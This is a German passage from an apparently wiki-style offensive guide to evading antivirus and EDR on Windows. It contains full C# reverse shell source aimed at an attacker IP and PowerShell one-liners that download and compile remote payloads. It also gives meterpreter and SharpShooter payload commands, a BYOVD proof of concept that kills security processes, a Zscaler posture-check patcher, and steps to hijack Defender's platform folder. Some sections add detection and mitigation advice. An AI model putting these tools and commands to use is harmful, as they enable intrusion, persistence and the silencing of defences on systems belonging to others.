<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsfähiger Logging-Mechanismus in Windows, der es Anwendungen und Systemkomponenten ermöglicht, **Ereignisse zu protokollieren**. Er kann jedoch auch von Sicherheitsprodukten genutzt werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie bei der Deaktivierung (Umgehung) von AMSI ist es auch möglich, die Funktion **`EtwEventWrite`** des Benutzermodusprozesses so zu verändern, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dies geschieht, indem die Funktion im Speicher gepatcht wird, sodass sie sofort returniert und dadurch das ETW-Logging für diesen Prozess effektiv deaktiviert.

Mehr Infos findest du in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C# Binaries direkt in den Speicher ist schon seit einiger Zeit bekannt und ist weiterhin eine sehr gute Methode, um Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da das Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C# Assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Wege, dies zu tun:

- **Fork\&Run**

Dabei wird ein **neuer Opferprozess gestartet**, dein post-exploitation bösartiger Code in diesen neuen Prozess injiziert, ausgeführt und nach Abschluss der neue Prozess beendet. Das hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantatsprozesses stattfindet. Das bedeutet, wenn bei unserer Post-Exploitation-Aktion etwas schiefgeht oder entdeckt wird, besteht eine **viel größere Wahrscheinlichkeit**, dass unser **Implantat überlebt.** Der Nachteil ist, dass du eine **größere Chance** hast, durch **Behavioural Detections** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der post-exploitation bösartige Code **in den eigenen Prozess** injiziert. Auf diese Weise vermeidest du das Erstellen eines neuen Prozesses und das Scannen durch AV, aber der Nachteil ist, dass, wenn bei der Ausführung deines Payloads etwas schiefgeht, die **Wahrscheinlichkeit**, deinen **Beacon zu verlieren**, deutlich höher ist, da es zum Absturz kommen kann.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C# Assemblies lesen möchtest, schau dir diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C# Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem man der kompromittierten Maschine Zugriff **to the interpreter environment installed on the Attacker Controlled SMB share** gibt.

Indem man Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share erlaubt, kann man **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Das Repo weist darauf hin: Defender scannt weiterhin die Skripte, aber durch die Nutzung von Go, Java, PHP etc. hat man **mehr Flexibilität, um statische Signaturen zu umgehen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, die einem Angreifer erlaubt, **das Access Token oder ein Sicherheitsprodukt wie ein EDR oder AV zu manipulieren**, sodass dessen Privilegien reduziert werden — der Prozess stirbt nicht, hat aber nicht mehr die Berechtigungen, nach bösartigen Aktivitäten zu prüfen.

Um dies zu verhindern, könnte Windows **externen Prozessen** den Zugriff auf Handles zu den Tokens von Sicherheitsprozessen verwehren.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Wie in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf dem PC eines Opfers zu installieren und es dann zu übernehmen und Persistenz zu erreichen:
1. Download von https://remotedesktop.google.com/, klicke auf "Set up via SSH" und dann auf die MSI-Datei für Windows, um die MSI herunterzuladen.
2. Installiere den Installer still im Opferrechner (Admin erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome Remote Desktop-Seite zurück und klicke auf Weiter. Der Assistent wird dich zur Autorisierung auffordern; klicke auf Authorize, um fortzufahren.
4. Führe den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachte den pin-Parameter, mit dem die PIN festgelegt werden kann, ohne die GUI zu verwenden).


## Advanced Evasion

Evasion ist ein sehr komplexes Thema; manchmal muss man viele verschiedene Telemetriequellen in nur einem System berücksichtigen, daher ist es nahezu unmöglich, in ausgereiften Umgebungen vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir dringend, diesen Talk von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist auch ein großartiger Talk von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile der Binary entfernt**, bis es **herausfindet, welchen Teil Defender** als bösartig einstuft, und es dir aufteilt.\
Ein weiteres Tool, das **das Gleiche macht**, ist [**avred**](https://github.com/dobin/avred) mit einem offenen Webservice unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows10 wurde allen Windows-Versionen ein **Telnet server** mitgeliefert, den man (als Administrator) so installieren konnte:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lassen Sie es beim Systemstart **starten** und führen Sie es jetzt **aus**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet-Port ändern** (stealth) und Firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du möchtest die bin downloads, nicht das setup)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Aktiviere die Option _Disable TrayIcon_
- Setze ein Passwort in _VNC Password_
- Setze ein Passwort in _View-Only Password_

Dann verschiebe die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **victim**

#### **Reverse connection**

Der **attacker** sollte auf seinem **host** das Binary `vncviewer.exe -listen 5900` ausführen, damit es vorbereitet ist, eine reverse **VNC connection** aufzufangen. Dann, auf dem **victim**: Starte den winvnc daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNUNG:** Um unentdeckt zu bleiben darfst du einige Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe, ob es läuft mit `tasklist | findstr winvnc`
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst öffnet sich [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png)
- Führe `winvnc -h` nicht für Hilfe aus, sonst löst du ein [popup](https://i.imgur.com/oc18wcu.png) aus

### GreatSCT

Herunterladen von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Innerhalb von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Starte jetzt **den lister** mit `msfconsole -r file.rc` und **führe** die **xml payload** aus mit:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unser eigenes reverse shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erstes C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwende es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# mit Compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste von C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel: Verwendung von python zum Erstellen von injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Space deaktivieren

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um Endpoint-Schutzmaßnahmen zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL) AV-Services nicht blockieren können.

Wichtige Erkenntnisse
1. **Signed driver**: Die Datei, die auf die Festplatte geschrieben wird, heißt `ServiceMouse.sys`, aber das Binary ist der rechtmäßig signierte Treiber `AToolsKrnl64.sys` von Antiy Labs’ “System In-Depth Analysis Toolkit”. Weil der Treiber eine gültige Microsoft-Signatur trägt, wird er geladen, selbst wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service** und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland erreichbar wird.
3. **Vom Treiber bereitgestellte IOCTLs**
| IOCTL code | Funktion                              |
|-----------:|----------------------------------------|
| `0x99000050` | Einen beliebigen Prozess anhand der PID beenden (wird verwendet, um Defender/EDR-Dienste zu beenden) |
| `0x990000D0` | Eine beliebige Datei auf der Festplatte löschen |
| `0x990001D0` | Den Treiber entladen und den Service entfernen |

Minimales C Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**: BYOVD umgeht User-Mode-Schutzmechanismen vollständig; Code, der im Kernel ausgeführt wird, kann geschützte Prozesse öffnen, diese beenden oder Kernel-Objekte manipulieren – unabhängig von PPL/PP, ELAM oder anderen Härtungsmechanismen.

Erkennung / Gegenmaßnahmen
•  Aktivieren Sie Microsofts Blockliste für verwundbare Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.  
•  Überwachen Sie die Erstellung neuer *Kernel*-Services und alarmieren Sie, wenn ein Treiber aus einem weltweit beschreibbaren Verzeichnis geladen wird oder nicht auf der Allow-List steht.  
•  Achten Sie auf User-Mode-Handles zu benutzerdefinierten Device-Objekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Umgehung der Zscaler Client Connector Posture-Checks durch Patchen signierter Binaries auf der Festplatte

Der **Client Connector** von Zscaler wendet device-posture-Regeln lokal an und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen machen eine vollständige Umgehung möglich:

1. Die Posture-Auswertung erfolgt **ausschließlich clientseitig** (es wird ein Boolean an den Server gesendet).  
2. Interne RPC-Endpunkte prüfen lediglich, dass das verbindende Executable **von Zscaler signiert** ist (via `WinVerifyTrust`).

Durch das **Patchen von vier signierten Binaries auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Ursprüngliche Logik gepatcht | Ergebnis |
|--------|------------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | Mit NOPs neutralisiert ⇒ jeder Prozess (auch nicht signierte) kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen am Tunnel | Kurzgeschlossen |

Minimaler Patcher-Auszug:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nachdem die Originaldateien ersetzt und der Service-Stack neu gestartet wurden:

* **Alle** Posture-Checks werden als **grün/konform** angezeigt.
* Nicht signierte oder veränderte Binärdateien können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, wie von den Zscaler-Richtlinien definiert.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgangen werden können.

## Missbrauch von Protected Process Light (PPL), um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Signer-/Level-Hierarchie, sodass nur gleich- oder höhergestufte geschützte Prozesse sich gegenseitig manipulieren können. Im offensiven Einsatz: Wenn Sie eine PPL-enabled binary legitim starten und deren Argumente kontrollieren können, können Sie harmlose Funktionalität (z. B. Logging) in ein eingeschränktes, von PPL abgesichertes Schreib-Primitive gegen geschützte Verzeichnisse verwandeln, die von AV/EDR verwendet werden.

What makes a process run as PPL
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess erstellt werden, unter Verwendung der Flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Ein kompatibles Protection-Level muss angefordert werden, das zum Signer der Binary passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Level führen beim Erstellen zum Fehler.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-Source-Helfer: CreateProcessAsPPL (wählt das Protection-Level aus und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Nutzungsmuster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, abgesehen von der Platzierung nicht kontrollieren; das Primitive eignet sich eher zur Korruption als zur präzisen Inhaltsinjektion.
- Erfordert lokalen Administrator/SYSTEM, um einen Service zu installieren/zu starten, und ein Reboot-Fenster.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Boot‑Zeit vermeidet Dateisperren.

Erkennungen
- Prozess-Erstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn sie von nicht-standardmäßigen Launchern als Parent gestartet werden, in Boot‑Nähe.
- Neue Services, die verdächtige Binaries für Auto‑Start konfigurieren und konsequent vor Defender/AV starten. Untersuche Service‑Erstellung/-Änderung vor Defender‑Startup‑Fehlern.
- File‑Integrity‑Monitoring für Defender‑Binaries/Platform‑Verzeichnisse; unerwartete Datei‑Erstellungen/-Änderungen durch Prozesse mit protected‑process‑Flags.
- ETW/EDR‑Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und nach anomalem PPL‑Level‑Einsatz durch Nicht‑AV‑Binaries.

Gegenmaßnahmen
- WDAC/Code Integrity: Beschränke, welche signierten Binaries als PPL laufen dürfen und unter welchen Elternprozessen; blockiere ClipUp‑Aufrufe außerhalb legitimer Kontexte.
- Service‑Hygiene: Beschränke Erstellung/Änderung von Auto‑Start‑Services und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass Defender Tamper Protection und Early‑Launch‑Schutz aktiviert sind; untersuche Startup‑Fehler, die auf Binary‑Korruption hindeuten.
- Erwäge das Deaktivieren der 8.3‑Kurznamens‑Generierung auf Volumes, die Security‑Tooling hosten, wenn das mit deiner Umgebung kompatibel ist (gründlich testen).

Referenzen zu PPL und Tools
- Microsoft Protected Processes - Übersicht: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU‑Referenz: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulation von Microsoft Defender durch Symlink‑Hijack des Platform‑Version‑Ordners

Windows Defender wählt die Platform, von der es ausgeführt wird, indem es Unterordner unter
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`
aufzählt.

Er wählt den Unterordner mit dem lexikographisch höchsten Versionsstring (z. B. `4.18.25070.5-0`) und startet die Defender‑Serviceprozesse von dort (aktualisiert entsprechend Service-/Registry‑Pfade). Diese Auswahl vertraut Verzeichniseinträgen einschließlich Directory Reparse Points (Symlinks). Ein Administrator kann dies nutzen, um Defender auf einen für Angreifer beschreibbaren Pfad umzuleiten und DLL‑Sideloading oder Service‑Störungen zu erreichen.

Voraussetzungen
- Lokaler Administrator (benötigt, um Verzeichnisse/Symlinks unter dem Platform‑Ordner zu erstellen)
- Möglichkeit zu rebooten oder die Defender‑Platform‑Neuauswahl auszulösen (Service‑Neustart beim Boot)
- Nur eingebaute Tools erforderlich (mklink)

Warum das funktioniert
- Defender blockiert Schreibzugriffe in seinen eigenen Ordnern, aber seine Platform‑Auswahl vertraut Verzeichniseinträgen und wählt lexikographisch den höchsten Versionsstring, ohne zu validieren, dass das Ziel zu einem geschützten/vertrauten Pfad aufgelöst wird.

Schritt‑für‑Schritt (Beispiel)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Symlink zu einem Verzeichnis mit höherer Version, das auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Auslöserauswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen Sie, dass MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Sie sollten den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Service-Konfiguration/Registry sehen, die diesen Speicherort widerspiegelt.

Post-exploitation options
- DLL sideloading/code execution: DLLs ablegen/ersetzen, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Prozessen von Defender auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entfernen Sie den version-symlink, sodass beim nächsten Start der konfigurierte Pfad nicht aufgelöst wird und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachte, dass diese Technik für sich genommen keine Privilegieneskalation bietet; sie erfordert admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams können Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs durch vom Angreifer kontrollierten, position‑independent code (PIC) leiten. Dies verallgemeinert evasion über die kleine API‑Oberfläche hinaus, die viele Kits bereitstellen (z. B. CreateProcessA), und erweitert denselben Schutz auf BOFs und post‑exploitation DLLs.

Allgemeiner Ansatz
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Warum IAT hooking hier
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
